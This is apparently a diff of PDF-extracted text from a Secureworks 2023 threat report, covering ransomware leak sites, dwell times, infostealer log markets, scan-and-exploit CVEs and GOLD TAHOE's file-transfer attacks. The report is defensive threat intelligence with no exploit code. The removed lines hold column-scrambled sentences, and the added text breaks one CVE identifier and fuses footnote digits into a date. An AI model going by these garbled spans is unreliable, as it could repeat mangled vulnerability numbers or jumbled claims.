+MalasLocker, 8BASE and Akira all emerged only in May 2023\. 8BASE 
+listed nearly 40 victims on its leak site during June 2023, only 
+slightly fewer than LockBit. Analysis indicates it posted a dump 
+of victims going as far back as mid\-2022 all at the same time. 
+MalasLocker attacks, targeting Zimbra servers from the end of 
+March 20233 and listed on their leak site in May, accounted for at 
+least 171 victims. This provides just one illustration of how valuable 
+scan\-and\-exploit (where threat actors use search engines to identify 
+vulnerable systems) can be as a tactic for ransomware groups.
+0
+200
+400
+600
+800
+1000
+1200
+BlackCatALPHV
+CL0P
+BianLian
+Royal
+Black Basta
+MalasLocker
+PLAY
+8BASE
+Karakurt
+Vice Society
+Hive
+Medusa
+Akira
+Snatch
+STORMOUS
+BlackByte
+RansomHouse
+LV
+AvosLocker
+LockBit
+984
+355
+207
+202
+197
+195
+171
+143
+108
+90
+90
+78
+65
+56
+55
+51
+46
+45
+43
+30
+Figure 4\. The 20 most active name\-and\-shame ransomware groups by victims listed between July 2022 and June 2023\. (Source: Secureworks)
+11
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Assessing the Size of the
+Ransomware Problem
+Accurately assessing the scale of the ransomware problem is 
+challenging. Leak sites only touch on a fraction of the problem and 
+not all ransomware groups operate leak sites. New ransomware 
+variants launch regularly. Without a leak site, it is very difficult to 
+judge how active they are.
+The primary purpose of leak sites is to encourage currently 
+recalcitrant victims to pay. Therefore, they only show the names 
+of victims who are yet to pay a ransom. As such, they cannot be 
+considered an accurate record of any specific group's activity.
+Nor are they an indication of the overall impact of ransomware.
+Historic data from ransomware group takedowns or collapses 
+indicate that leak sites only reveal a small percentage of overall 
+attacks. For example, Hive's leak site listed 150 organizations, likely 
+accounting for around 10 percent of their overall victim count of 
+1,500\. Avaddon listed just 180 victims, a small fraction of the nearly 
+3,000 decryption keys the group released when it shuttered the 
+operation. It is difficult to assess how representative these
+examples are.
+To extrapolate, we would need to know how successful each group's 
+leak site is and what the likelihood of payment by a victim once they 
+have been named is. It may not be outlandish to assume that the 
+vast majority of successful ransomware operations occur without 
+the victim's name ever reaching the leak sitethat is where the 
+incentive to pay lies, with the victim motivated to prevent public 
+disclosure.
+Leak sites generally do not reveal whether ransomware was deployed. 
+And we can't draw conclusions about how effective or impactful 
+a ransomware deployment was, and whether the victim did not 
+pay because the impact was low, or because the data stolen was 
+inconsequential.
+Name\-and\-shame statistics are useful for some things. They show 
+how particular variants emerge onto the scene and how they 
+grow and shrink in usage. But how reliable are they as indicators of 
+impact? Without knowing how many victims pay the ransom, we 
+can't determine how successful any particularly variant is in terms of 
+payment to victim ratio. Leak site data should therefore be used with 
+caution. In aggregate though it is clear from the continued activity 
+that ransomware and data\-theft extortion remain a viable criminal 
+business model and a substantial threat to businesses.
+12
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Dwell Times Are Dropping for 
+Ransomware Attacks
+Despite the increasing threat posed by ransomware attacks, in 
+many cases early detection and response thwarts attackers from 
+progressing to ransomware deployment. Because of this, our incident 
+responders frequently discover ransomware precursor activity 
+without evidence of damaging system encryption events. 
+However, there have been some interesting trends over the past 
+year in those attacks where ransomware is deployed. Most notably, 
+the dwell timethe time between gaining access to a network and 
+executing the ransomwarehas significantly reduced compared to 
+previous years.
+In just over ten percent of cases, we saw ransomware 
+deployed within five hours of initial access.
+Nearly two\-thirds of attacks were carried out inside one 
+single day, nearly four fifths within one week.
+In around a fifth of attacks, the threat actor sat on 
+the network for longer than a week before deploying 
+ransomware.
+Of those, three\-quarters continued to sit on the network 
+for over a month.
+Notably, the median dwell time in ransomware engagements 
+dropped to just under 24 hours from 4\.5 days in the previous year 
+and 5\.5 days in the year before that. 
+Importantly, the incident response engagements that provided 
+the data used to make this calculation featured a broad range of 
+18 different ransomware variants. This means that the data was 
+not skewed by a prevalence of variants that are known typically to 
+be deployed very quickly, such as Phobos ransomware. The dwell 
+times in engagements where exfiltration of data was observed 
+were generally longer, but this is not universally true; in some 
+engagements involving Black Basta, Hive, and AvosLockerall 
+double extortion ransomware schemeswe observed data 
+exfiltration and ransomware deployment taking place more quickly 
+than the median dwell time of 24 hours.
+Average (median) dwell 
+time for ransomware actors
+24 hours
+13
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+So why are threat actors executing their ransomware attacks 
+so much more quickly? CTU researchers have observed that 
+ransomware intrusions have become less complex. Threat actors 
+are not conducting the same operations more quickly. Instead, they 
+are conducting simpler operations. Devastating enterprise\-wide 
+encryption events, which are more difficult to execute and take 
+longer to carry out, are now rarer than in previous years. 
+One driver for this is likely the need to reduce dwell time to lower 
+the chance of detection. The cybersecurity industry is undoubtedly 
+getting better at detecting the activity that has historically preceded 
+ransomware, such as the use of offensive security toolkits like Cobalt 
+Strike. This may be a factor in forcing ransomware operators to work 
+more quickly. 
+However, it is also likely that the threat actors now deploying 
+ransomware are just lower skilled than previous operators. The 
+introduction of the RaaS model lowered the bar to entry, introducing 
+playbooks for affiliates to use, and allowed it to scale significantly as 
+a result. 
+Arguably, this represents a commodification of the ransomware 
+landscape, with scheme operators reducing the cost of operations 
+in order to increase volume. This can be seen in the sheer number 
+of victims named on name\-and\-shame leak sites. But it is also 
+reflected in the quality of ransomware operations. This might 
+provide one reason why fewer victims are reported4 to be paying 
+ransoms (although such reports may not give a full picture, given 
+the fracturing of the ransomware landscape and the increasing 
+difficulties in reliably identifying cryptocurrency wallets). 
+This absolutely does not imply that ransomware can now be ignored 
+as a threat. Even a limited distribution on a victim's network can be 
+highly damaging. Hitting a single server in a production environment, 
+for example, might be enough to take business operations offline for 
+enough time to cause significant financial impact. And ransomware 
+operators and their affiliates are aware of this. The increased take\-up 
+of virtualized environments, now often crucial to many companies' 
+IT infrastructures, makes them a viable target. More and more 
+ransomware schemes now have Linux\-compatible variants, created 
+to target VMware ESXi hosts. Threat actors have an incentive to 
+spend minimal time on a likely\-monitored Windows system before 
+moving to encrypt hundreds of virtual disks on a single VMware ESXi 
+host.
+Dwell times can vary considerably case by case. In July 2022, in an 
+incident involving the financially motivated GOLD TOMAHAWK 
+threat group (also known as Karakurt), Secureworks incident 
+responders identified 29 hosts and 10 user accounts compromised 
+by the threat actor. Over 300GB of compressed data was exfiltrated 
+from two of these hosts. The attacker had remained on the network 
+for as long as six weeks before incident responders were engaged, 
+navigating across multiple hosts in different countries possibly to 
+locate data to steal. The unusually long dwell time included a three\-
+week hiatus from malicious activity.
+In contrast, in April 2023, Secureworks incident responders 
+investigated an incident where an organization that did not use 
+Secureworks managed services experienced an intrusion where, 
+within a single 24\-hour period, two different ransomware variants, 
+Buhti and AvosLocker, were deployed. 
+14
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+The Top Initial Access Vectors
+for Ransomware
+Scan\-and\-exploit and stolen credentials were the two largest initial 
+access vectors used by threat actors in the ransomware attacks 
+Secureworks investigated, each accounting for approximately 32 
+percent of intrusions. These figures are consistent with the top 
+IAVs for all incident response engagements over the same period 
+but represent a change relative to ransomware engagements in the 
+previous twelve months. This is the period covered in last year's State 
+of the Threat report, when scan\-and\-exploit at 52 percent accounted 
+for many more ransomware intrusions than the next nearest IAV, 
+stolen credentials, at 39 percent. 
+Secureworks incident responders also investigated several intrusions 
+where threat actors used the Qakbot malware to deliver Cobalt 
+Strike, which then led to Black Basta ransomware deployment. These 
+incidents were notable due to the speed of the operations: again, 
+data exfiltration and ransomware deployment occurred within 24 
+hours of initial access.
+Ransomware Initial Access 
+Vectors
+The three largest initial access vectors (IAVs) observed 
+during ransomware engagements where customers 
+engaged Secureworks incident responders were:
+Scan\-and\-exploit32 percent
+Stolen credentials32 percent
+Commodity malware delivered via 
+phishing emails14 percent
+Each of these IAVs can either be prevented or detected 
+at an early stage before ransomware is deployed, using 
+a combination of prompt and regular patching, multi\-
+factor authentication, and comprehensive implementing 
+of monitoring solutions.
+15
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+The most likely enabler of the rise in the use of stolen credentials 
+as an IAV is the explosion in infostealer activity. Infostealers are 
+a type of malware that can pilfer sensitive information such as 
+login credentials, session cookies and tokens, financial details, and 
+personal data from compromised computers and networks. Once 
+installed via methods such as phishing attacks, infected websites, 
+and malicious software downloads, they can execute and exit very 
+quickly, sometimes in less than a minute of total runtime. The data 
+is then packaged and sold as logs. Each log contains data taken by 
+the infostealer from a compromised user machine.
+Threat actors use these stolen credentials to gain unauthorized 
+access to enterprise networks via remote access services such as 
+virtual private networks (VPNs) and Microsoft Office Web Access 
+(OWA). This unauthorized access can form an early stage in the 
+exfiltration of sensitive data or the deployment of ransomware. As 
+a result, infostealers are a significant type of intrusion precursor 
+malware and a contributory factor to attacks that often happens 
+outside protective corporate controls.
+crypto wallets
+VPN data
+credentials
+visited domains
+cookies
+tokens
+local application
+data
+documents
+system
+information
+network
+information
+software
+information
+web browser
+data
+log
+Figure 5\. What's in a log? (Source: Secureworks)
+16
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Figure 6\. Threat actor Telegram channel listing logs prices and deals.
+(Source: Secureworks)
+Opening the Valves on the 
 Infostealer Data to Threat
-Actor PipelineInitial access using stolen credentials accounted for up to 32 percentof the ransomware incident response engagements we handled inthe last year. Credentials can be obtained via a variety of means,including phishing emails that lead victims to credential harvestingwebsites, or through previous breaches.Innovations in TTPs Occur04When Infection Chains AreHowever, in the past year, there has been a significant increase inthe use of infostealers to obtain credentials. A thriving market clearlyForced to Evolveexists, and new infostealers are regularly developed and put up forsale to meet this demand.Russian Market remains by far the most prolific marketplace5 forinfostealer logs. On a single day in June 2022, there were 2\.9 millionlogs advertised for sale. A year later, that figure has ballooned toover 7 million, over 2\.4 times as many, and a notable increase on thefive million that were available on a single day in late February 2023\.Other markets include 2easy and Genesis Market, and there is also asignificant level of trade via certain Telegram channels.0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixFigure 6\. Threat actor Telegram channel listing logs prices and deals.
-(Source: Secureworks)2023 State of the Threat: A Year in Review1601Letter From Our VPBuyers on these marketplaces are likely discerning, seeking outHowever, sometimes there are rich pickings to be had. In Octoberlogs containing credentials to particularly high\-value organizations2022, we observed a vendor on an underground forum auctioningbefore making a purchase. However, CTU researchers have observedaccess to a home PC belonging to an employee of a global brand inthat the bulk of logs available for purchase contain credentials forthe food and drink industry. According to the seller, virtual networksystems like social media platforms and common webmail services.computing (VNC) credentials and cookies harvested from theThese are not likely to be of great value to ransomware operatorsemployee's personal computer facilitated access to a corporatespecifically looking to extort organizations. This means that thedashboard and the user's Outlook inbox. This could allow a threatmajority of available stock likely consists of a large number of olderactor to conduct reconnaissance, pivot deeper into the network,logs deemed of limited value to users.conduct phishing attacks, or deploy ransomware.0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixFigure 7\. Underground forum post advertising access to corporate resources via a personal computer. (Source: Secureworks)2023 State of the Threat: A Year in Review1701Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixHome devices have provided fertile ground for infostealers overCredentials go for a premium on underground forums andthe past year. Based on posts observed by CTU researchers, mostmarketplaces because it is highly likely they are used to facilitatedevices infected with an infostealer were running Windows 7 Homecybercrime\-related intrusions, including ransomware. The time lapseor Windows 10 Home operating systems. Typically, home computersbetween theft and use further shows the value for organizations ofalso have weaker security controls than corporate\-managedmonitoring forums for stolen data.devices. CTU researchers expect to see an increase in the volume ofcorporate credentials stolen from compromised personal devices forabuse as an initial access vector for ransomware and other maliciousactivity. Limiting how employees access company resources frompersonally owned devices can greatly reduce the enterprise's riskfrom infostealers.Over the past year, Russian Market also added a pre\-order functionto its website, enabling buyers to request logs by domain or type. It isnot clear whether this functionality has been widely taken up, but thedevelopment implies that buyers can effectively pay sellers to targetspecific organizations or services.The development of new infostealer malware advertised for saleon underground forums also occurs at speed. In 30 days throughMay and June 2023, we saw 12 new infostealers made available forpurchase or rent on underground forums. Once advertised, they aretested and reviewed by forum users. Their developers rely on positivefeedback for success and not all will become widely used.Although the use of these tools to harvest credentials is clearlywidespread, firm evidence connecting specific stealers to specificcompromises is scant. This is likely to be down to two key factors:one, if credentials are used in a compromise, their origin is rarelymade clear and two, the time delay between them being collectedby an infostealer and used in an intrusion is likely to be significant,and certainly well beyond the scope of most incident responseengagements.Figure 8\. Extract from an advertisement for the Meduza Stealer.
-(Source: Secureworks)2023 State of the Threat: A Year in Review18Scan\-and\-ExploitWhy
-Patching PaysScan\-and\-exploit, where threat actors use search engines likeShodan to identify vulnerable systems, can lead to spikes in attackactivity by specific groups, and even anomalistic peaks in name\-and\-shame ransomware activity. MalasLocker ransomware listed171 victims on their leaksite by exploiting Zimbra servers vulnerableto CVE\-2022\-27924, a cross\-site scripting (XSS) flaw impactingZimbra Collaboration Suite 8\.8\.15\. Clop operator GOLD TAHOEspecializes in acquiring and exploiting specific vulnerabilities in filetransfer solutions (see the section later in the report) to impactmaximum numbers of victims.Initial access broker GOLD MELODY has also favored scanninginternet\-facing servers to identify and exploit vulnerabilitiesto opportunistically compromise networks. In August 2022,Secureworks incident responders worked on an engagementwhere the group likely exploited a Log4j vulnerability (CVE\-2021\-4104\) to compromise an organization's internet\-facing FlexeraFlexNet server.Chinese ransomware group6 BRONZE STARLIGHT also uses scan\-and\-exploit attacks to target unpatched internet\-facing servers.For example, in August 2022, CTU researchers observed BRONZESTARLIGHT compromising an organization's vulnerable internet\-facing ManageEngine server. Other state\-sponsored groups dependon scan\-and\-exploit too, for example China's BRONZE ATLAS andIran's COBALT MIRAGE.The easy availability of information about vulnerable servers caneven see multiple threat actors compromising a network using thesame vulnerability, at the same time or in quick succession.The annual listing of top routinely exploited vulnerabilities publishedby CISA and partner agencies lists top vulnerabilities that threatactors scan for. Frequently, this list contains older vulnerabilities.Of the top 12 vulnerabilities exploited during 2022 listed in theroundup7 for the year, seven have CVE dates of earlier than 2022\.One, CVE\-2018\-13379, a path traversal vulnerability in FortinetFortiOS and FortiProxy, also made the top 15 routinely exploited listin 2021 and in 2020\.While organizations should always prioritize their patching scheduleaccording to their individual risk profile, the vulnerabilities listed inthese reports likely remain at high risk of exploitation.01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review1901Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to EvolveData Leak\-Only AttacksWhat's 
-the Impact?Despite initial questions about whether threat actors would finddata leak\-only extortion a lucrative endeavor, threat groups thatspecialize in this type of attack continue their activities. Karakurt,thought to be a spin\-off of the now defunct Conti ransomwareoperation, persists in regularly naming victims on its leak site at anaverage of seven a month. And arguably the biggest ransomwareevent of the last yearthe exploitation of a zero\-day vulnerabilityin the MOVEit Transfer file management softwaredid not involveactual ransomware at all. GOLD TAHOE continue a long\-term trendof targeting such utilities to steal data and hold it to ransom, namingmany hundreds of alleged victims on its Clop leak site.0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review2001Letter From Our VPGOLD TAHOE Has Two Strings
-to Its BowExecutive Summaryand Key FindingsThe GOLD TAHOE threat group, operator of Clop ransomwareand the Clop Leaks site, has been around for over a decade. Itslisted victims, while the data theft\-only operation features theremainder. And the bulk of those are from two campaigns from2023\. By exploiting zero\-day vulnerabilities in two file managementservicesFortra's GoAnywhere MFT in March and ProgressSoftware's MOVEit Transfer application in Maythe group claimsto have successfully stolen data from over three hundred victimsand possibly as many as six hundred. It is not possible to gaugeexactly how many were affected given that the victims named onleak sites constitute those who have not paid the ransom.Such activity for a ransomware group is unusual, but it forms themost recent chapter in its exploitation of vulnerabilities to stealand ransom victim data. Since late 2020, the group has sought toexploit both zero\-day and N\-day vulnerabilities in file managementapplications to extort the users of such services. Their use of zero\-day vulnerabilities is notable, and shows how well\-resourced thegroup iszero\-days are expensive to develop or procure, and werehistorically the domain of state\-sponsored actors.members have worked with GOLD DRAKE (EvilCorp, Dridex), GOLDBLACKBURN (TrickBot), GOLD NIAGARA (FIN7\), and other well\-known threat groups. Perhaps because of these connections, GOLDTAHOE does not openly communicate on any criminal forums. Andwhile the group does not operate its ransomware as a RaaS, it doesappear to rely on another group, GOLD NIAGARA, to deliver itsransomware in a private arrangement.But the Clop ransomware itself tells only half of the story. While theleak site the group has operated since August 2020 lists victimsof its ransomware operations, it also carries the names of thosetargeted in its attempts at data theft\-only extortion. There aremany more names of the latter type than there are of the former;Clop ransomware deployments account for around a quarter of0203The Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixDecember 2020January 2021July 2021March 2023May 2023Accellion FTA exploitation via 
+Actor Pipeline
+Initial access using stolen credentials accounted for up to 32 percent 
+of the ransomware incident response engagements we handled in 
+the last year. Credentials can be obtained via a variety of means, 
+including phishing emails that lead victims to credential harvesting 
+websites, or through previous breaches. 
+However, in the past year, there has been a significant increase in 
+the use of infostealers to obtain credentials. A thriving market clearly 
+exists, and new infostealers are regularly developed and put up for 
+sale to meet this demand. 
+Russian Market remains by far the most prolific marketplace5 for 
+infostealer logs. On a single day in June 2022, there were 2\.9 million 
+logs advertised for sale. A year later, that figure has ballooned to 
+over 7 million, over 2\.4 times as many, and a notable increase on the 
+five million that were available on a single day in late February 2023\. 
+Other markets include 2easy and Genesis Market, and there is also a 
+significant level of trade via certain Telegram channels.
+17
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Buyers on these marketplaces are likely discerning, seeking out 
+logs containing credentials to particularly high\-value organizations 
+before making a purchase. However, CTU researchers have observed 
+that the bulk of logs available for purchase contain credentials for 
+systems like social media platforms and common webmail services. 
+These are not likely to be of great value to ransomware operators 
+specifically looking to extort organizations. This means that the 
+majority of available stock likely consists of a large number of older 
+logs deemed of limited value to users. 
+However, sometimes there are rich pickings to be had. In October 
+2022, we observed a vendor on an underground forum auctioning 
+access to a home PC belonging to an employee of a global brand in 
+the food and drink industry. According to the seller, virtual network 
+computing (VNC) credentials and cookies harvested from the 
+employee's personal computer facilitated access to a corporate 
+dashboard and the user's Outlook inbox. This could allow a threat 
+actor to conduct reconnaissance, pivot deeper into the network, 
+conduct phishing attacks, or deploy ransomware. 
+Figure 7\. Underground forum post advertising access to corporate resources via a personal computer. (Source: Secureworks)
+18
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Home devices have provided fertile ground for infostealers over 
+the past year. Based on posts observed by CTU researchers, most 
+devices infected with an infostealer were running Windows 7 Home 
+or Windows 10 Home operating systems. Typically, home computers 
+also have weaker security controls than corporate\-managed 
+devices. CTU researchers expect to see an increase in the volume of 
+corporate credentials stolen from compromised personal devices for 
+abuse as an initial access vector for ransomware and other malicious 
+activity. Limiting how employees access company resources from 
+personally owned devices can greatly reduce the enterprise's risk 
+from infostealers.
+Over the past year, Russian Market also added a pre\-order function 
+to its website, enabling buyers to request logs by domain or type. It is 
+not clear whether this functionality has been widely taken up, but the 
+development implies that buyers can effectively pay sellers to target 
+specific organizations or services.
+The development of new infostealer malware advertised for sale 
+on underground forums also occurs at speed. In 30 days through 
+May and June 2023, we saw 12 new infostealers made available for 
+purchase or rent on underground forums. Once advertised, they are 
+tested and reviewed by forum users. Their developers rely on positive 
+feedback for success and not all will become widely used.
+Although the use of these tools to harvest credentials is clearly 
+widespread, firm evidence connecting specific stealers to specific 
+compromises is scant. This is likely to be down to two key factors: 
+one, if credentials are used in a compromise, their origin is rarely 
+made clear and two, the time delay between them being collected 
+by an infostealer and used in an intrusion is likely to be significant, 
+and certainly well beyond the scope of most incident response 
+engagements. 
+Credentials go for a premium on underground forums and 
+marketplaces because it is highly likely they are used to facilitate 
+cybercrime\-related intrusions, including ransomware. The time lapse 
+between theft and use further shows the value for organizations of 
+monitoring forums for stolen data.
+Figure 8\. Extract from an advertisement for the Meduza Stealer.
+(Source: Secureworks)
+Scan\-and\-ExploitWhy
+Patching Pays 
+Scan\-and\-exploit, where threat actors use search engines like 
+Shodan to identify vulnerable systems, can lead to spikes in attack 
+activity by specific groups, and even anomalistic peaks in name\-
+and\-shame ransomware activity. MalasLocker ransomware listed 
+171 victims on their leaksite by exploiting Zimbra servers vulnerable 
+to CVE\-2022\-27924, a cross\-site scripting (XSS) flaw impacting 
+Zimbra Collaboration Suite 8\.8\.15\. Clop operator GOLD TAHOE 
+specializes in acquiring and exploiting specific vulnerabilities in file 
+transfer solutions (see the section later in the report) to impact 
+maximum numbers of victims.
+Initial access broker GOLD MELODY has also favored scanning 
+internet\-facing servers to identify and exploit vulnerabilities 
+to opportunistically compromise networks. In August 2022, 
+Secureworks incident responders worked on an engagement
+where the group likely exploited a Log4j vulnerability (CVE\-2021\-
+1\. to compromise an organization's internet\-facing Flexera 
+FlexNet server. 
+Chinese ransomware group6 BRONZE STARLIGHT also uses scan\-
+and\-exploit attacks to target unpatched internet\-facing servers. 
+For example, in August 2022, CTU researchers observed BRONZE 
+STARLIGHT compromising an organization's vulnerable internet\-
+facing ManageEngine server. Other state\-sponsored groups depend 
+on scan\-and\-exploit too, for example China's BRONZE ATLAS and 
+Iran's COBALT MIRAGE. 
+The easy availability of information about vulnerable servers can 
+even see multiple threat actors compromising a network using the 
+same vulnerability, at the same time or in quick succession.
+The annual listing of top routinely exploited vulnerabilities published 
+by CISA and partner agencies lists top vulnerabilities that threat 
+actors scan for. Frequently, this list contains older vulnerabilities. 
+Of the top 12 vulnerabilities exploited during 2022 listed in the 
+roundup7 for the year, seven have CVE dates of earlier than 2022\. 
+One, CVE\-2018\-13379, a path traversal vulnerability in Fortinet 
+FortiOS and FortiProxy, also made the top 15 routinely exploited list 
+in 2021 and in 2020\.
+While organizations should always prioritize their patching schedule 
+according to their individual risk profile, the vulnerabilities listed in 
+these reports likely remain at high risk of exploitation.
+19
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+20
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Data Leak\-Only AttacksWhat's 
+the Impact?
+Despite initial questions about whether threat actors would find 
+data leak\-only extortion a lucrative endeavor, threat groups that 
+specialize in this type of attack continue their activities. Karakurt, 
+thought to be a spin\-off of the now defunct Conti ransomware 
+operation, persists in regularly naming victims on its leak site at an 
+average of seven a month. And arguably the biggest ransomware 
+event of the last yearthe exploitation of a zero\-day vulnerability 
+in the MOVEit Transfer file management softwaredid not involve 
+actual ransomware at all. GOLD TAHOE continue a long\-term trend 
+of targeting such utilities to steal data and hold it to ransom, naming 
+many hundreds of alleged victims on its Clop leak site.
+21
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Accellion FTA exploitation via 
 CVE\-2021\-27101 and 
-CVE\-2021\-27104 zero\-daysAccellion FTA exploitation via 
+CVE\-2021\-27104 zero\-days
+December 2020
+Accellion FTA exploitation via 
 CVE\-2021\-27103 and 
-CVE\-2021\-27102 zero\-daysExploitation of SolarWinds 
+CVE\-2021\-27102 zero\-days
+January 2021
+Exploitation of SolarWinds 
 Serv\-U CVE\-2021\-35211 
 vulnerability, previously exploited 
-by Chinese APT groupExploitation of GoAnywhere 
+by Chinese APT group
+July 2021
+Exploitation of GoAnywhere 
 MFT CVE\-2023\-0669 
-zero\-dayExploitation of MOVEit 
+zero\-day
+March 2023
+Exploitation of MOVEit 
 Transfer CVE\-2023\-34362 
-zero\-dayFigure 9\. Services exploited by GOLD TAHOE in attacks on file transfer solutions. (Source: Secureworks)2023 State of the Threat: A Year in Review2101Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to EvolveState\-SponsoredThreat Activity0506Exploiting these services gives the group access to shared files,some of which may come from third parties, as for example inthe Zellis payroll compromise8 which formed part of the MOVEitTransfer attacks. And while there is little an organization can do toprevent a breach of a trusted third\-party, especially through theabuse of a zero\-day vulnerability in the vendor's platform, there aresome steps organizations can take to detect and mitigate the threatposed by GOLD TAHOE.Enforce a retention policy on shared files to ensure datais available for only as long as it is needed.Protect highly sensitive data (like PII) with file levelencryption that requires a key that is not stored on thefile sharing service. If a platform does not support sucha facility, it may not be the best method of sharing thistype of data.Encrypt data in transit and at rest.Threat Actor Use ofArtificial IntelligenceEnable alerting that indicates when files are beingaccessed and monitor for anomalies.07ConclusionImplement auditing so that if a breach occurs it canbe quickly determined what files were present duringrelevant time period(s).08AppendixFor on\-premises solutions, implement network flowmonitoring to detect and alert on large data transfers.2023 State of the Threat: A Year in Review22The Conti ImplosionThe Hydra 
-is Dead but Its Limbs SurviveDarkside's rebranding as BlackMatter, the group instead apparentlyturned to other existing operations. As a result, Conti members andaffiliates began to work with other ransomware groups.The most obvious impact of the conflict in Ukraine on thecybercrime ecosystem was the implosion in the first half of 2022 ofGOLD ULRICK, the group behind Conti ransomware. The revelationsin the Conti Leaksa large disclosure of information about thegroup's activity, likely by a Ukrainian affiliate angered at the group'salmost immediate declaration of support for Russia's invasionpreceded the disappearance of Conti ransomware by a few months.While the full reasons for its dissolution remain unclear, it is likelythat affiliates were concerned about damage to the Conti name thatmight make it harder for victims to pay. GOLD ULRICK may also havebeen disconcerted by the U.S. Department of State announcing9in May 2022 a $10 million reward for information leading to theidentification or location of key leaders behind the Conti ransomwareoperation. Such unwanted scrutiny may have also been a cause forthe group's disappearance.However, that did not mean that group members remained absentfrom the ransomware ecosystem for long. Unlike previous disruptionsto ransomware activities that have resulted in rebrands, such asOne affiliate was observed going on to work with LockBit, Suncryptand Monti ransomware operations after Conti's demise. The apparentleader of the Conti ransomware operationrevealed as Stern inthe Conti chat logswas subsequently observed10 transacting withQuantum, Karakurt, Diavol, and Royal ransomware schemes. Otherschemes, such as BlackBasta and Nokoyawa, have also been linked11to former Conti operators.These observations demonstrate adaptability within a broad networkof criminals, whose relationships allow for cooperation to meetcommon ends. The ransomware ecosystem is not made up ofmonolithic units that operate within their own closed spheres. Theransomware\-as\-a\-service model 